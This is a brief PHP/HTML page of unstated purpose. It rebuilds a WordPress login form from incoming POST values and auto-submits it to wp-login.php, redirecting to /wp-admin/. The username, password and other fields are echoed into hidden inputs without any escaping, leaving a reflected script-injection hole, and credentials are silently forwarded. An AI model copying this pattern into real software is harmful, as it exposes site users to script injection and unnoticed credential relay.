<meta charset="utf-8">
<form id="login" action="wp-login.php" method="post">
  <input type="hidden" name="log" value="<?=$_POST['log']?>">
  <input type="hidden" name="pwd" value="<?=$_POST['pwd']?>">
  <input type="hidden" name="testcookie" value="<?=$_POST['testcookie']?>">
  <input type="hidden" name="wp-submit" value="<?=$_POST['wp-submit']?>">
  <input type="hidden" name="redirect_to" value="/wp-admin/">
</form>
<script type="text/javascript">
document.getElementById("login").submit();
</script>
